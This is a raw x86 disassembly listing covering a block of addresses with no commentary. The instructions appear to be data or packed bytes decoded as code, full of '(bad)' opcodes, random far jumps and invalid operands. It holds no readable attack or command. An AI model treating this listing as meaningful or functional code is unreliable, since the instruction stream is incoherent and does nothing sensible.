  4194da:	scas   eax,DWORD PTR es:[edi]
  4194db:	dec    ecx
  4194dc:	adc    BYTE PTR [esi-0x73],ah
  4194df:	push   cs
  4194e0:	xor    eax,0x74899531
  4194e5:	popf   
  4194e6:	(bad)  
  4194e7:	(bad)  
  4194e8:	mov    DWORD PTR [esi],ecx
  4194ea:	arpl   cx,bx
  4194ec:	rcr    BYTE PTR [ecx+0x60c02faf],cl
  4194f2:	add    dh,dl
  4194f4:	dec    esi
  4194f5:	pop    esi
  4194f6:	dec    edx
  4194f7:	xor    DWORD PTR [edi],esi
  4194f9:	data16 xor BYTE PTR [esi],al
  4194fc:	lods   eax,DWORD PTR ds:[esi]
  4194fd:	out    0xbc,al
  4194ff:	xor    edx,DWORD PTR [ecx-0x25920530]
  419505:	call   0x1f1d:0x51a05243
  41950c:	xor    eax,0xdbd838f0
  419511:	xchg   ebx,eax
  419512:	mov    ah,0xcc
  419514:	lsl    ebp,WORD PTR [ebx+0x7a17e382]
  41951b:	pop    esi
  41951c:	jo     0x4194cd
  41951e:	mov    ecx,0x1364f469
  419523:	in     al,0x31
  419525:	adc    edx,DWORD PTR [ebx-0x12]
  419528:	pop    ecx
  419529:	xor    eax,0xb8de2b89
  41952e:	lods   eax,DWORD PTR ds:[esi]
  41952f:	shr    cl,1
  419531:	inc    ebp
  419532:	mov    eax,ds:0xba3b4dfc
  419537:	(bad)  
  419539:	push   eax
  41953a:	mov    DWORD PTR [ecx],edx
  41953c:	test   al,0xbd
  41953e:	or     eax,0x4bad5384
  419543:	lds    edx,FWORD PTR [ebx+eiz*4-0x198f42f7]
  41954a:	add    DWORD PTR [esi-0x14ee9f5b],edi
  419550:	dec    eax
  419551:	push   esi
  419552:	pop    ebx
  419553:	jmp    0xb34c9826
  419558:	test   eax,0x7728d428
  41955d:	mov    ebx,0x268603a2
  419562:	xor    BYTE PTR [eax],bl
  419564:	and    ecx,edx
  419566:	das    
  419567:	mov    dh,0x7b
  419569:	retf   0xaed1
  41956c:	call   0xf997:0xa9aa076f
  419573:	jecxz  0x4195cf
  419575:	sub    BYTE PTR [edx+0x4ad0e241],ah
  41957b:	mov    BYTE PTR [edx+0x8aa52e6],bh
  419581:	or     BYTE PTR [edx-0x49f77a07],dh
  419587:	xchg   edx,eax
  419588:	iret   
  419589:	and    edx,ebp
  41958b:	loop   0x41951d
  41958d:	dec    edx
  41958e:	mov    WORD PTR [ebx-0x3cdaffa4],?
  419594:	dec    ebx
  419595:	div    BYTE PTR [ecx-0x40edfc9d]
  41959b:	ins    DWORD PTR es:[edi],dx
  41959c:	ds adc al,0x3d
  41959f:	push   0x68
  4195a1:	jecxz  0x41956a
  4195a3:	xchg   ebx,eax
  4195a4:	pop    ecx
  4195a5:	xchg   ebx,eax
  4195a6:	cmp    al,0x98
  4195a8:	pusha  
  4195a9:	adc    BYTE PTR [eax],al
  4195ab:	je     0x4195a3
  4195ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195ae:	(bad)  
  4195af:	pop    esp
  4195b0:	hlt    
  4195b1:	jae    0x4195ec
  4195b3:	enter  0xa80,0x9f
  4195b7:	push   es
  4195b8:	mov    eax,0x8a920c3f
  4195bd:	arpl   WORD PTR ds:0xec2a2039,bp
  4195c3:	std    
  4195c4:	pop    edi
  4195c5:	ret    
  4195c6:	(bad)  
  4195c7:	ffreep st(4)
  4195c9:	ret    0x6962
  4195cc:	into   
  4195cd:	xor    BYTE PTR [bx+di],bh
  4195d0:	or     esp,DWORD PTR [ebx-0xa118a4a]
  4195d6:	pop    esp
  4195d7:	and    DWORD PTR [eax-0x60],esi
  4195da:	mov    edx,0x2958164d
  4195df:	(bad)  
  4195e0:	test   eax,0xb3aceef4
  4195e5:	pushw  0x715
  4195e9:	add    BYTE PTR [edx+0x43bf584d],dl
  4195ef:	mov    ah,0x42
  4195f1:	ror    bl,1
  4195f3:	pop    ebx
  4195f4:	repz cmp BYTE PTR [ebp-0x68],dl
  4195f8:	les    eax,FWORD PTR [esi]
  4195fa:	cs push eax
  4195fc:	lock add BYTE PTR [edx],cl
  4195ff:	repnz stc 
  419601:	outs   dx,BYTE PTR ds:[esi]
  419602:	mov    dl,BYTE PTR [edi-0x64]
  419605:	sbb    DWORD PTR [edi],esi
  419607:	sub    BYTE PTR [edx],0xb6
  41960a:	(bad)  
  41960b:	and    al,0x2
  41960d:	pop    ecx
  41960e:	mov    ah,0xc1
  419610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419612:	sti    
  419613:	mov    eax,ds:0x7877d4ce
  419618:	pop    ss
  419619:	add    al,0x2e
  41961b:	push   0x5826f425
  419620:	sub    al,0xc2
  419622:	dec    esi
  419623:	fdivp  st(3),st
  419625:	out    dx,eax
  419626:	cld    
  419627:	mov    bl,0xae
  419629:	cld    
  41962a:	or     al,0x42
  41962c:	mov    es,WORD PTR [esi]
  41962e:	imul   DWORD PTR [edx]
  419630:	mov    BYTE PTR [ecx+0x5f3a2eb5],0xa0
  419637:	xchg   edi,eax
  419638:	mul    DWORD PTR es:[eax-0x54]
  41963c:	iret   
  41963d:	std    
  41963e:	pop    edi
  41963f:	xchg   ebx,eax
  419640:	cli    
  419641:	xchg   esp,eax
  419642:	or     bl,BYTE PTR [eax]
  419644:	cdq    
  419645:	repnz xchg esi,eax
  419647:	loop   0x419656
  419649:	sbb    eax,0x53c33079
  41964e:	push   0xffffffe0
  419650:	jmp    0xd305:0x2aaa2c38
  419657:	push   0x77
  419659:	repnz ins DWORD PTR es:[edi],dx
  41965b:	mov    eax,0x693f8a46
  419660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419661:	in     al,0x2
  419663:	xor    BYTE PTR [ebp+0xa895428],ah
  419669:	retf   0x57a3
  41966c:	ret    0x8881
  41966f:	jle    0x419650
  419671:	xchg   ecx,eax
  419672:	stos   BYTE PTR es:[edi],al
  419673:	cmp    al,0x2a
  419675:	mov    fs,WORD PTR [edi]
  419677:	(bad)  [ebp-0x5b]
  41967a:	xor    al,0xec
  41967c:	out    0x42,al
  41967e:	xchg   ebp,eax
  41967f:	xchg   BYTE PTR [ecx+esi*2-0x2d],ch
  419683:	(bad)  
  419684:	xlat   BYTE PTR ds:[ebx]
  419685:	popf   
  419686:	jge    0x41961a
  419688:	aam    0x4b
  41968a:	fmul   DWORD PTR [edi+0x3abfd376]
  419691:	mov    cl,0x79
  419693:	xchg   ebx,eax
  419694:	rcr    DWORD PTR [ebx+ebx*1+0x6c8b1cb8],0x5c
  41969c:	out    0x51,al
  41969e:	popa   
  41969f:	out    dx,al
  4196a0:	inc    ebp
  4196a1:	mov    cl,0x37
  4196a3:	mov    WORD PTR [edi+0x5e43342f],?
  4196a9:	jmp    0xf416:0xa1a493c1
  4196b0:	sbb    dl,bl
  4196b2:	mov    BYTE PTR [edi+0x66],ch
  4196b5:	mul    BYTE PTR [eax]
  4196b7:	pop    esi
  4196b9:	nop
  4196ba:	int3   
  4196bb:	in     al,dx
  4196bc:	pop    esp
  4196bd:	jo     0x419731
  4196bf:	pop    es
  4196c0:	in     al,0xf4
  4196c2:	dec    esp
  4196c3:	ror    BYTE PTR [esi-0x57d17234],cl
  4196c9:	scas   eax,DWORD PTR es:[edi]
  4196ca:	inc    esi
  4196cb:	xlat   BYTE PTR ds:[ebx]
  4196cc:	pop    esp
  4196cd:	call   0xeb9b:0xef5b0b8b
  4196d4:	or     BYTE PTR [ebx+0x6e2d5acc],al
  4196da:	and    esi,DWORD PTR [esi-0x1d204196]
  4196e0:	xchg   edx,eax
  4196e1:	gs mov esp,0x8474b210
  4196e7:	gs rcl dl,1
  4196ea:	and    edi,edx
  4196ec:	inc    eax
  4196ed:	push   esi
  4196ee:	mov    esi,0x5b24edb0
  4196f3:	mov    ecx,DWORD PTR ds:[ebp-0x1127ecd1]
  4196fa:	lods   eax,DWORD PTR ds:[esi]
  4196fb:	clc    
  4196fc:	gs retf 0xb453
  419700:	adc    cl,BYTE PTR [edx]
  419702:	sti    
  419703:	mov    ch,0x27
  419705:	sbb    eax,0x97c4dfec
  41970a:	lods   eax,DWORD PTR ds:[esi]
  41970b:	mov    ah,0x3f
  41970d:	dec    esp
  41970e:	and    dl,BYTE PTR [ebp-0x8b9c0c8]
  419714:	and    al,bh
  419716:	iret   
  419717:	mov    bh,0x93
  419719:	fs mov ah,0x17
  41971c:	sub    eax,0xa83c469a
  419721:	and    al,0x71
  419723:	aad    0x90
  419725:	sbb    BYTE PTR [ebp-0x6c130dcb],dl
  41972b:	add    al,0x3f
  41972d:	cdq    
  41972e:	leave  
  41972f:	cmc    
  419730:	mov    ds:0x457c2693,eax
  419735:	cmp    al,bl
  419737:	dec    esp
  419738:	xor    ah,BYTE PTR [edx-0x94fa8f]
  41973e:	(bad)  [eax+0x56]
  419741:	jo     0x41970c
  419743:	push   0x4e
  419745:	popf   
  419746:	mov    al,ds:0x493d0736
  41974b:	push   esi
  41974c:	lahf   
  41974d:	and    dh,ah
  41974f:	pop    eax
  419750:	cmp    bh,BYTE PTR [edx]
  419752:	push   esp
  419753:	(bad)  
  419754:	fistp  WORD PTR [edi-0x700d8d9d]
  41975a:	ins    DWORD PTR es:[edi],dx
  41975b:	popa   
  41975c:	fist   WORD PTR [edi-0x3f]
  41975f:	mov    ch,0xcf
  419761:	mov    dh,0x8a
  419763:	les    esi,FWORD PTR [ebx-0x699e2649]
  419769:	and    DWORD PTR [esi+0x5a],ebp
  41976c:	inc    eax
  41976d:	in     eax,0x4a
  41976f:	xchg   edi,eax
  419770:	fist   WORD PTR [edx+esi*8+0x2d]
  419774:	int    0xca
  419776:	pop    eax
  419777:	loope  0x41976e
  419779:	out    dx,eax
  41977a:	enter  0x8a07,0x44
  41977e:	push   edi
  41977f:	out    dx,eax
  419780:	aam    0x7d
  419782:	push   ss
  419783:	and    BYTE PTR fs:[eax-0x7],0x48
  419788:	hlt    
  419789:	pop    es
  41978a:	nop
  41978b:	cmp    BYTE PTR [edx],ah
  41978d:	std    
  41978e:	xchg   ecx,eax
  41978f:	enter  0xafca,0x6b
  419793:	xor    al,0x96
  419795:	neg    DWORD PTR [edi+0x7f]
  419798:	call   0x776f:0x67268251
  41979f:	repnz in eax,dx
  4197a1:	sbb    BYTE PTR [esi],dl
  4197a3:	xchg   ebx,eax
  4197a4:	cli    
  4197a5:	aad    0x91
  4197a7:	mov    ah,0xfe
  4197a9:	sbb    DWORD PTR ds:[edx+0x11],0xebdf72f5
  4197b1:	retf   0x846
  4197b4:	or     al,0x65
  4197b6:	and    bh,bl
  4197b8:	sbb    esp,eax
  4197ba:	hlt    
  4197bb:	sbb    cl,bh
  4197bd:	mov    al,0x11
  4197bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197c0:	call   0x9582173b
  4197c5:	lahf   
  4197c6:	pushf  
  4197c7:	xchg   ecx,eax
  4197c8:	cmp    al,0x92
  4197ca:	pop    ecx
  4197cb:	(bad)  
  4197cc:	shl    BYTE PTR [ebx-0x43b859d8],0xe2
  4197d3:	in     al,0xce
  4197d5:	xor    bl,cl
  4197d7:	bound  edx,QWORD PTR [ebx+0x4b]
  4197da:	mov    ds:0xd409469c,eax
  4197df:	popf   
  4197e0:	repz pop eax
  4197e2:	and    eax,0xab2e915e
  4197e7:	pop    esi
  4197e8:	mov    al,cl
  4197ea:	js     0x4197cd
  4197ec:	jns    0x419836
  4197ee:	adc    BYTE PTR [edx-0x5c4979d0],bl
  4197f4:	mov    esi,0x8451952c
  4197f9:	lds    ebx,FWORD PTR ds:0x3af13dba
  4197ff:	mov    ebp,0x620453ad
  419804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419805:	mov    ecx,0x72288de
  41980a:	lahf   
  41980b:	ror    ah,1
  41980d:	mov    esi,0xda979d11
  419812:	ror    bh,0xff
  419815:	aam    0x15
  419817:	stos   BYTE PTR es:[edi],al
  419818:	mov    al,0x7d
  41981a:	loop   0x41987e
  41981c:	aaa    
  41981d:	cld    
  41981e:	add    edx,DWORD PTR [ecx-0x2b]
  419821:	inc    esp
  419822:	mov    ?,WORD PTR [edi+0x67]
  419825:	mov    ds:0x98985581,al
  41982a:	ja     0x419866
  41982c:	inc    esp
  41982d:	icebp  
  41982e:	pop    es
  41982f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419830:	mov    ds:0x81d813f5,al
  419835:	sar    BYTE PTR [edx],1
  419837:	hlt    
  419838:	in     eax,dx
  419839:	fwait
  41983a:	push   cs
  41983b:	in     al,0x6b
  41983d:	pop    dx
  41983f:	push   ebx
  419840:	lahf   
  419841:	outs   dx,DWORD PTR ds:[esi]
  419842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419843:	push   ds
  419844:	and    ch,al
  419846:	inc    ebp
  419847:	sub    ebx,DWORD PTR [ecx+0x41]
  41984a:	imul   edx,ecx,0x74cd3651
  419850:	jb     0x4198cb
  419852:	ror    DWORD PTR [ebp+0x51],1
  419855:	jo     0x4198d0
  419857:	adc    BYTE PTR [esi+0x4c],bl
  41985a:	add    bh,dh
  41985c:	and    ebp,ecx
  41985e:	inc    ecx
  41985f:	cmp    ah,BYTE PTR [edx+0x74]
  419862:	cmp    ebp,esp
  419864:	cmp    DWORD PTR [ebx+0x4ce82240],ecx
  41986a:	pop    ds
  41986b:	dec    esi
  41986c:	add    esp,ecx
  41986e:	enter  0x7fd8,0xd7
  419872:	push   edi
  419873:	adc    BYTE PTR [ebx+0x35023c99],ch
  419879:	mov    dl,BYTE PTR [esi+0x895ed3f]
  41987f:	retf   
  419880:	leave  
  419881:	retf   0x8126
  419884:	aam    0x6
  419886:	and    BYTE PTR ds:0xf11d3c59,bh
  41988c:	out    0x22,al
  41988e:	ds mov eax,0xfd481e08
  419894:	or     ah,dh
  419896:	xchg   edi,eax
  419897:	sub    DWORD PTR [esi+0x1d],edx
  41989a:	mov    al,ds:0x85d49d73
  41989f:	mov    esp,0x97511a6
  4198a4:	mov    DWORD PTR [ebx-0x7bcfb552],esi
  4198aa:	mov    edx,0xca316b0a
  4198af:	push   es
  4198b0:	jne    0x4198f1
  4198b2:	jp     0x4198da
  4198b4:	sbb    DWORD PTR [ecx],0xae843193
  4198ba:	mov    bl,BYTE PTR [edi+0x3eace273]
  4198c0:	mov    fs,WORD PTR [ebp+0x2a]
  4198c3:	pop    sp
  4198c5:	jg     0x419890
  4198c7:	pop    ds
  4198c8:	inc    edx
  4198c9:	xor    dh,0xa4
  4198cc:	in     eax,dx
  4198cd:	xor    al,BYTE PTR [eax-0x63]
  4198d0:	or     esp,esi
  4198d2:	xor    al,0x3e
  4198d4:	das    
  4198d5:	cmp    bh,BYTE PTR [esi]
  4198d7:	pop    ebp
  4198d8:	(bad)  
  4198d9:	dec    ebx
  4198da:	xor    BYTE PTR [ecx],dl
  4198dc:	xchg   edi,eax
  4198dd:	lock add BYTE PTR [esp+ebp*1],al
  4198e1:	xchg   esp,eax
  4198e2:	leave  
  4198e3:	out    dx,eax
  4198e4:	aaa    
  4198e5:	stos   BYTE PTR es:[edi],al
  4198e6:	sahf   
  4198e7:	pop    edi
  4198e8:	outs   dx,DWORD PTR ds:[esi]
  4198e9:	xor    al,0xe1
  4198eb:	je     0x4198b7
  4198ed:	and    edx,esi
  4198ef:	outs   dx,BYTE PTR ds:[esi]
  4198f0:	popf   
  4198f1:	popf   
  4198f2:	sub    eax,0xd78a157e
  4198f7:	retf   0x378c
  4198fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198fb:	mov    bh,BYTE PTR [ecx+edx*8+0x3c]
  4198ff:	in     eax,dx
  419900:	jb     0x419968
  419902:	scas   eax,DWORD PTR es:[edi]
  419903:	jns    0x419941
  419905:	(bad)  
  419906:	jl     0x4198f9
  419908:	scas   eax,DWORD PTR es:[edi]
  419909:	xor    eax,0xf7c41747
  41990e:	sbb    eax,0x3041557c
  419913:	dec    ecx
  419914:	sbb    al,0xd7
  419916:	sti    
  419917:	inc    ecx
  419918:	cld    
  419919:	mov    dh,ch
  41991b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41991c:	and    BYTE PTR [esi-0x223a405c],0xe2
  419923:	push   ebx
  419924:	or     ch,al
  419926:	loopne 0x4198ae
  419928:	mov    dh,BYTE PTR [ecx]
  41992a:	pusha  
  41992b:	add    dl,bh
  41992d:	iret   
  41992e:	jno    0x41992a
  419930:	adc    cl,cl
  419932:	jb     0x419974
  419934:	push   0x12
  419936:	arpl   WORD PTR [ebx-0x23],bx
  419939:	lea    ebp,[esi]
  41993b:	xor    eax,0x26768900
  419940:	inc    eax
  419941:	inc    esp
  419942:	mov    esi,0xbee5f7cc
  419947:	sbb    al,0x47
  419949:	dec    edi
  41994a:	push   edi
  41994b:	dec    edi
  41994c:	xor    edi,esp
  41994e:	rcl    DWORD PTR [ebx],cl
  419950:	inc    esp
  419951:	or     eax,0x5bf586a
  419956:	pop    es
  419957:	js     0x419936
  419959:	inc    edi
  41995a:	add    al,0xed
  41995c:	push   esi
  41995d:	rcr    DWORD PTR [ebx],1
  41995f:	inc    ecx
  419960:	xor    BYTE PTR [eax-0x2c8cfda7],dh
  419966:	lock dec ebp
  419968:	mov    ?,ecx
  41996a:	cmp    eax,0xb8170b66
  41996f:	cli    
  419970:	and    ch,BYTE PTR [esi+0x44e4bf2d]
  419976:	sub    edx,DWORD PTR [edx-0x5a3bc9ff]
  41997c:	iret   
  41997d:	inc    esp
  41997e:	ins    BYTE PTR es:[edi],dx
  41997f:	loope  0x41990c
  419981:	xor    DWORD PTR [eax+ebx*8],0x3a495517
  419988:	mov    bh,0x91
  41998a:	lock hlt 
  41998c:	scas   al,BYTE PTR es:[edi]
  41998d:	push   ss
  41998e:	dec    edi
  41998f:	adc    BYTE PTR [eax],dh
  419991:	jge    0x419a06
  419993:	mov    ds:0xb1484930,eax
  419998:	xchg   esi,eax
  419999:	or     BYTE PTR [ecx],0x72
  41999c:	repnz mov eax,ds:0xbf8b26eb
  4199a2:	push   eax
  4199a3:	and    al,0xe8
  4199a5:	inc    ecx
  4199a6:	retf   0xf5b7
  4199a9:	mov    DWORD PTR [eax],ebx
  4199ab:	jbe    0x419a22
  4199ad:	add    ah,bh
  4199af:	leave  
  4199b0:	int    0xe2
  4199b2:	fwait
  4199b3:	and    DWORD PTR ds:[esi+0x114ac5af],ebp
  4199ba:	pop    es
  4199bb:	repnz adc al,0x99
  4199be:	xchg   esi,eax
  4199bf:	mov    cl,BYTE PTR [ebp+0x7]
  4199c2:	adc    al,0x65
  4199c4:	icebp  
  4199c5:	stos   DWORD PTR es:[edi],eax
  4199c6:	inc    edx
  4199c7:	inc    esi
  4199c8:	(bad)
  4199cc:	cld    
  4199cd:	gs popa 
  4199cf:	push   ebx
  4199d0:	xchg   BYTE PTR [edx],dh
  4199d2:	lea    edi,[ebp+0x44d8cce1]
  4199d8:	mov    ebx,0x1463bf0a
  4199dd:	pop    ebx
  4199de:	sbb    BYTE PTR [eax],al
  4199e0:	fidiv  DWORD PTR [edi]
  4199e2:	and    BYTE PTR ds:0xc9d5ba23,ah
  4199e8:	(bad)  
  4199e9:	arpl   WORD PTR [esi+0x45],dx
  4199ec:	icebp  
  4199ed:	or     bl,BYTE PTR [ebp+0x6f3d15c7]
  4199f3:	push   cs
  4199f4:	inc    esp
  4199f5:	(bad)  
  4199f6:	scas   al,BYTE PTR es:[edi]
  4199f7:	or     al,0xf0
  4199f9:	jmp    0x3271cd83
  4199fe:	xor    al,0x45
  419a00:	aam    0xca
  419a02:	invd   
  419a04:	dec    esp
  419a05:	jmp    0x419a38
  419a07:	sbb    al,0x54
  419a09:	in     eax,0x75
  419a0b:	(bad)  
  419a0e:	pop    ebx
  419a0f:	dec    edx
  419a10:	cld    
  419a11:	lahf   
  419a12:	hlt    
  419a13:	xchg   ebp,eax
  419a14:	or     BYTE PTR [ebx+0x17404a15],dl
  419a1a:	iret   
  419a1b:	dec    ebp
  419a1c:	pop    ebx
  419a1d:	sbb    edx,DWORD PTR [edi-0x24]
  419a20:	adc    DWORD PTR ds:0x2334,esp
  419a25:	out    0x7d,eax
  419a27:	cmp    ecx,esp
  419a29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a2a:	mov    ebx,0x15ed43b1
  419a2f:	das    
  419a30:	adc    bh,bl
  419a32:	je     0x4199ce
  419a34:	dec    esp
  419a35:	jo     0x4199c8
  419a37:	scas   al,BYTE PTR es:[edi]
  419a38:	test   BYTE PTR [eax-0x72],dh
  419a3b:	int3   
  419a3c:	int    0x5e
  419a3e:	mov    dl,0x99
  419a40:	adc    al,0x80
  419a42:	cdq    
  419a43:	dec    edx
  419a44:	cmp    al,0x91
  419a46:	imul   ebp,esp,0x2f5ecac6
  419a4c:	jmp    0x419a31
  419a4e:	nop
  419a4f:	dec    ebp
  419a50:	test   edx,ebp
  419a52:	mov    ds:0x4615a3eb,eax
  419a57:	pop    ebp
  419a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a59:	mov    esi,0x2c503988
  419a5e:	mov    ds:0x7ad5be4b,al
  419a63:	dec    eax
  419a64:	fild   WORD PTR [ebx+eax*4-0x291e7011]
  419a6b:	cld    
  419a6c:	not    DWORD PTR ds:0x91400343
  419a73:	pop    edi
  419a74:	sbb    esp,DWORD PTR [eax-0x29]
  419a77:	test   BYTE PTR [ecx],dl
  419a79:	fisttp QWORD PTR [ebx-0xeb75f41]
  419a7f:	es clc 
  419a81:	jmp    0xb4f9:0x8d9650ad
  419a88:	nop
  419a89:	mov    ds:0xfe1f501,eax
  419a8e:	mov    BYTE PTR [ebp-0x7e],dl
  419a91:	mov    cl,0x9e
  419a93:	dec    ebx
  419a94:	or     eax,0x33535080
  419a99:	push   es
  419a9a:	in     al,0xd0
  419a9c:	pop    ds
  419a9d:	icebp  
  419a9e:	test   al,0x68
  419aa0:	repz dec esp
  419aa2:	(bad)  
  419aa3:	(bad)  
  419aa5:	arpl   WORD PTR [eax+0x5d633044],ax
  419aab:	mov    bh,al
  419aad:	fnstcw WORD PTR [edx-0x47d85737]
  419ab3:	lahf   
  419ab4:	loopne 0x419b0c
  419ab6:	inc    esp
  419ab7:	mov    eax,ds:0xf302baf3
  419abc:	(bad)  
  419abd:	mov    ebx,0x46bd358b
  419ac2:	jecxz  0x419a72
  419ac4:	syscall 
  419ac6:	adc    al,0x6b
  419ac8:	cld    
  419ac9:	xor    DWORD PTR [edi-0x4d],eax
  419acc:	out    0x5e,eax
  419ace:	popa   
  419acf:	cmp    edx,eax
  419ad1:	rcl    BYTE PTR [edx],0x1d
  419ad4:	pusha  
  419ad5:	cmp    DWORD PTR [ebx-0x31b516c8],0x469febe0
  419adf:	test   BYTE PTR [eax],al
  419ae1:	mov    esp,0x3014d192
  419ae6:	mov    ebp,DWORD PTR [edi-0x21]
  419ae9:	pop    ecx
  419aea:	call   0x8c3aec8a
  419aef:	push   es
  419af0:	dec    ecx
  419af1:	or     BYTE PTR [edi+0x32],cl
  419af4:	xor    DWORD PTR [edi],ebp
  419af6:	je     0x419ae3
  419af8:	adc    esi,DWORD PTR gs:[ebx+0x7f]
  419afc:	adc    BYTE PTR [eax],dl
  419afe:	ins    BYTE PTR es:[edi],dx
  419aff:	sub    DWORD PTR [edx],ebp
  419b01:	mov    bl,0xd3
  419b03:	or     al,0x89
  419b05:	sub    ecx,esp
  419b07:	mov    esi,esp
  419b09:	loopne 0x419b2b
  419b0b:	xchg   ebp,eax
  419b0c:	mov    ecx,0xa0b3c44c
  419b11:	mov    ecx,esp
  419b13:	mov    esp,0x243528b4
  419b18:	xlat   BYTE PTR ds:[ebx]
  419b19:	cmp    al,0x11
  419b1b:	push   es
  419b1c:	push   es
  419b1d:	inc    esi
  419b1e:	cmp    eax,0x18d8eaf4
  419b23:	cdq    
  419b24:	bound  edi,QWORD PTR [edi-0xe8a3e94]
  419b2a:	pusha  
  419b2b:	jns    0xb7b0a1bb
  419b31:	cmp    DWORD PTR es:[esi-0x70f22e7f],eax
  419b38:	scas   al,BYTE PTR es:[edi]
  419b39:	lds    esi,FWORD PTR [edi-0x7a]
  419b3c:	les    eax,FWORD PTR [ebp+0x2d3abab4]
  419b42:	xchg   BYTE PTR [ecx],cl
  419b44:	outs   dx,DWORD PTR ds:[esi]
  419b45:	pop    ebp
  419b46:	fisub  WORD PTR ds:0xdcd9cbe3
  419b4c:	mov    bl,0xf2
  419b4e:	adc    eax,0x4b1443e9
  419b53:	repz popa 
  419b55:	inc    edi
  419b56:	scas   al,BYTE PTR es:[edi]
  419b57:	add    eax,0x6134ca32
  419b5c:	addr16 cs inc ebx
  419b5f:	xchg   edi,eax
  419b60:	sar    DWORD PTR [edx+0x1aab69b8],0x50
  419b67:	pop    ebx
  419b68:	or     edi,DWORD PTR [esi-0x27]
  419b6b:	mov    ebp,0xdb913d1a
  419b70:	dec    edi
  419b71:	xchg   ebx,eax
  419b72:	pop    esi
  419b73:	dec    ebx
  419b74:	jae    0x419b03
  419b76:	xchg   esi,eax
  419b77:	sar    dh,1
  419b79:	dec    esi
  419b7a:	and    al,BYTE PTR [ecx+ebx*8+0xf]
  419b7e:	(bad)  
  419b7f:	mov    ebx,0xac6533a9
  419b84:	sar    DWORD PTR [ecx],0x41
  419b87:	in     eax,0x9e
  419b89:	mov    edi,0x55119bd9
  419b8e:	mov    bh,0xa8
  419b90:	mov    cl,0xe4
  419b92:	mov    cl,0xf5
  419b94:	sbb    al,0x2c
  419b96:	rcr    ebp,1
  419b98:	jb     0x419b7e
  419b9a:	or     edi,ebp
  419b9c:	mov    ch,0x3e
  419b9e:	add    ebp,ebx
  419ba0:	add    al,0x39
  419ba2:	sub    al,0x44
  419ba4:	pop    ecx
  419ba5:	aad    0x2
  419ba7:	(bad)  
  419ba8:	out    0x60,eax
  419baa:	mov    edx,0xfe9bd05a
  419baf:	pop    ebp
  419bb0:	mov    WORD PTR ds:0x5b44f4f0,ss
  419bb6:	sub    DWORD PTR [ecx-0x20d9277],esi
  419bbc:	mov    ecx,0xd017baa9
  419bc1:	(bad)  
  419bc2:	out    dx,eax
  419bc3:	mov    ch,0xdc
  419bc5:	adc    esp,DWORD PTR [ebx]
  419bc7:	pop    es
  419bc8:	inc    ebp
  419bc9:	jbe    0x419bbf
  419bcb:	add    al,0xb8
  419bcd:	cmp    BYTE PTR [eax+0x3383e482],ch
  419bd3:	call   0xba67:0xaea030a7
  419bda:	das    
  419bdb:	imul   eax,ebp,0xffffffbf
  419bde:	test   DWORD PTR [edx+0x1d],0x73da7d36
  419be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419be6:	call   DWORD PTR [edi]
  419be8:	and    bh,0xdc
  419beb:	cdq    
  419bec:	pop    eax
  419bed:	mov    edx,0x875e8eff
  419bf2:	sahf   
  419bf3:	rol    DWORD PTR [ecx-0x64809846],0x6e
  419bfa:	lods   eax,DWORD PTR ss:[esi]
  419bfc:	or     eax,0x3c5a0eb
  419c01:	(bad)  
  419c02:	sbb    eax,0xea74580
  419c07:	pop    ebp
  419c08:	sar    edx,0xc2
  419c0b:	lea    esi,[eax-0x53]
  419c0e:	add    BYTE PTR [eax+ebx*8-0x599fe70d],ch
  419c15:	jae    0x419c8d
  419c17:	xchg   esi,eax
  419c18:	jo     0x419bf1
  419c1a:	stos   DWORD PTR es:[edi],eax
  419c1b:	mov    dl,0x60
  419c1d:	mov    edx,0x5dc0c02f
  419c22:	push   edx
  419c23:	pop    eax
  419c24:	mov    ebp,0x13caa61e
  419c29:	ins    DWORD PTR es:[edi],dx
  419c2a:	sahf   
  419c2b:	pop    esi
  419c2c:	into   
  419c2d:	aam    0xcd
  419c2f:	fmul   DWORD PTR [esi]
  419c31:	jbe    0x419bec
  419c33:	(bad)  
  419c34:	xor    BYTE PTR [ebp+0xb],dl
  419c37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c38:	add    BYTE PTR [edi-0x70],bh
  419c3b:	inc    ecx
  419c3c:	out    dx,al
  419c3d:	adc    DWORD PTR [eax-0x16c6cf07],ebx
  419c43:	jnp    0x419caf
  419c45:	add    esi,DWORD PTR [ebx-0x733f4378]
  419c4b:	sbb    DWORD PTR [edi],0xfc37b06c
  419c51:	and    cl,BYTE PTR [edi+0x1949d392]
  419c57:	es cmc 
  419c59:	inc    ebp
  419c5a:	add    ecx,eax
  419c5c:	and    BYTE PTR [edi+0x40],bh
  419c5f:	fwait
  419c60:	loopne 0x419c35
  419c62:	mov    WORD PTR [edi+0x616c41a4],ss
  419c68:	push   edx
  419c69:	shr    DWORD PTR [edx-0x6dcba93a],0x96
  419c70:	push   ss
  419c71:	cmp    al,0xf3
  419c73:	mov    eax,ds:0x5ff776a0
  419c78:	shl    BYTE PTR ds:0x2b90dcd2,cl
  419c7e:	test   al,0xcc
  419c80:	les    ebx,FWORD PTR [eax-0x62]
  419c83:	dec    ebx
  419c84:	mov    al,ds:0x787f1384
  419c89:	mov    BYTE PTR [eax+0x8],al
  419c8c:	int    0x5d
  419c8e:	xchg   ebx,eax
  419c8f:	arpl   WORD PTR [ebx+0x1c],si
  419c92:	mov    BYTE PTR [ebx-0x60],cl
  419c95:	(bad)  
  419c96:	imul   ebp,edx,0xf734ecf6
  419c9c:	stos   DWORD PTR es:[edi],eax
  419c9d:	mov    bh,0x8c
  419c9f:	xchg   esi,eax
  419ca0:	pop    ecx
  419ca1:	mov    edi,0x4c5053e1
  419ca6:	mov    edi,0x620c1775
  419cab:	add    dl,BYTE PTR [edi]
  419cad:	in     al,0xf1
  419caf:	stos   DWORD PTR es:[edi],eax
  419cb0:	pop    esp
  419cb1:	mov    edx,0xe3567f72
  419cb6:	cwde   
